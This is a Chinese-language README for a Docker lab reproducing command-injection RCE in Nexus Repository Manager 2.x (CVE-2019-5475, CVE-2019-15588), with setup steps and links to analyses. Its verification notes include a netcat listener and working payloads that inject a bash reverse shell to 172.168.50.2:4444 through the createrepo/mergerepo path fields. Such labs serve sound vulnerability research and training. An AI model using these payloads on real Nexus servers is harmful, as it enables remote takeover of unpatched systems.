# CVE-2019-5475

> CVE-2019-5475 与 CVE-2019-15588 靶场: RCE 漏洞

------

## 0x10 靶场环境

![](https://img.shields.io/badge/Docker-latest-brightgreen.svg) ![](https://img.shields.io/badge/Nexus-2.14.9-brightgreen.svg) ![](https://img.shields.io/badge/Nexus-2.14.14-brightgreen.svg)



## 0x20 目录结构

```
CVE-2019-5475
├── nexus ................... [Nexus 容器的数据挂载目录]
├── attacker ................ [攻击者机器的构建目录]
│   └── Dockerfile .......... [攻击者机器的 Docker 构建文件]
├── docker-compose.yml ...... [Docker 的构建配置]
├── imgs .................... [辅助 README 说明的图片]
└── README.md ............... [此 README 说明]
```

## 0x40 靶场搭建

- 宿主机预装 docker 和 docker-compose
- 下载本仓库： [git clone https://github.com/lyy289065406/CVE-2019-5475](https://github.com/lyy289065406/CVE-2019-5475)
- 打开 Nexus 构建目录： `cd CVE-2019-5475`
- 构建并运行 Nexus： `docker-compose up -d`
- 约 5 分钟后可从浏览器访问 Nexus （BasicAuth 均为 admin/admin），其中：


| Nexus | CVE | URL |
|:----:|:----:|:----|
| 2.14.9 | CVE-2019-5475 | [http://127.0.0.1:8009/nexus](http://127.0.0.1:8009/nexus) |
| 2.14.15 | CVE-2019-15588 | [http://127.0.0.1:8015/nexus](http://127.0.0.1:8015/nexus) |


## 0x50 靶场验证



https://paper.seebug.org/1260/
【CVE-2019-5475 Nexus 2.x命令注入】 漏洞分析

https://github.com/jaychouzzk/CVE-2019-5475-Nexus-Repository-Manager-
https://blog.spoock.com/2018/11/25/getshell-bypass-exec/
https://qiita.com/shimizukawasaki/items/41794616f1f2e602e4f5



http://127.0.0.1:8081/nexus/#capabilities

等待反弹shell
docker exec -it -u root `docker ps -aq --filter name=docker_attacker` /bin/bash
nc -lvvp 4444


均可利用
Path of "createrepo"
Path of "mergerepo"  


CVE-2019-5475
https://github.com/sonatype/nexus-public/blob/release-2.14.9-01/plugins/yum/nexus-yum-repository-plugin/src/main/java/org/sonatype/nexus/yum/internal/capabilities/YumCapability.java#L82
https://github.com/sonatype/nexus-public/tree/release-2.14.9-01
sonatype/nexus:2.14.9-01  
payload:  bash -c id || python
exp:      bash -c $@|bash 0 echo bash -i >&/dev/tcp/172.168.50.2/4444 0>&1 || python


CVE-2019-15588
环境变量问题，必须写 /bin/bash
https://github.com/sonatype/nexus-public/tree/release-2.14.14-01
sonatype/nexus:2.14.14-01  payload
payload:  /bin/bash -c id || /createrepo
exp:      /bin/bash -c $@|/bin/bash 0 echo /bin/bash -i >&/dev/tcp/172.168.50.2/4444 0>&1 || /createrepo


https://github.com/sonatype/nexus-public/tree/release-2.14.15-01
sonatype/nexus:2.14.15-01  payload
? 


sonatype/nexus:2.14.9-01 ： windows 利用
sonatype/nexus:2.14.14-01 ： Linux 利用
sonatype/nexus:2.14.15-01 ： windows 利用 (配合构件上传功能创建目录)